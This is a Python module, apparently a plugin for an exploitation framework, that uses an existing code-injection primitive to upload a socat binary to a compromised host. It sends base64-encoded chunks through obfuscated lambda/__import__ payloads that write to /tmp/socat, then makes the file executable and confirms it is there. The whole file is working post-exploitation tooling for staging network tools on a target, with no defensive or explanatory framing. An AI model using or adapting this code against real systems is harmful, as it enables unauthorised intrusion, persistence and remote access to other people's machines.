import base64
import os
import time

def run(exploit, params=None):
    G, R, Y, B, C, M, N = "\033[92m", "\033[91m", "\033[93m", "\033[94m", "\033[96m", "\033[95m", "\033[0m"
    
    local_bin_path = "binaries/socat"
    remote_path = "/tmp/socat"
    chunk_size = 30000  # ~30KB per chunk to stay under common web limits

    if not os.path.exists(local_bin_path):
        print(f" {R}!!{N} Local binary not found at {local_bin_path}")
        return

    # 1. Clean up any existing partial file
    exploit.execute(f"(lambda i: i('os').remove('{remote_path}') if i('os').path.exists('{remote_path}') else None)(__import__)")

    print(f" {Y}[*]{N} Reading {local_bin_path}...")
    with open(local_bin_path, "rb") as f:
        binary_data = f.read()
    
    encoded_bin = base64.b64encode(binary_data).decode()
    total_size = len(encoded_bin)
    chunks = [encoded_bin[i:i+chunk_size] for i in range(0, total_size, chunk_size)]

    print(f" {Y}[*]{N} Uploading {len(chunks)} chunks to {remote_path}...")

    for i, chunk in enumerate(chunks):
        # Append mode 'ab' is crucial here
        payload = (
            f"(lambda i: ( "
            f"  (lambda f: f.write(i('base64').b64decode('{chunk}')) or f.close())(i('builtins').open('{remote_path}', 'ab')) "
            f"))(__import__)"
        )
        exploit.execute(payload)
        
        # Progress bar logic
        progress = int((i + 1) / len(chunks) * 100)
        print(f"\r {B}[{progress}%]{N} Sending chunk {i+1}/{len(chunks)}...", end="", flush=True)

    # 2. Finalize: Set permissions
    exploit.execute(f"(lambda i: i('os').chmod('{remote_path}', 0o755))(__import__)")
    print(f"\n {G}●{N} Setting executable permissions...")

    # 3. Verification
    check = exploit.execute(f"(lambda i: i('os').path.exists('{remote_path}'))(__import__)")
    if "True" in str(check):
        size = exploit.execute(f"(lambda i: i('os').path.getsize('{remote_path}'))(__import__)")
        print(f" {G}● SUCCESS{N}: Binary verified at {remote_path} ({size} bytes)")
    else:
        print(f" {R}!! FAILED{N}: Binary still not found.")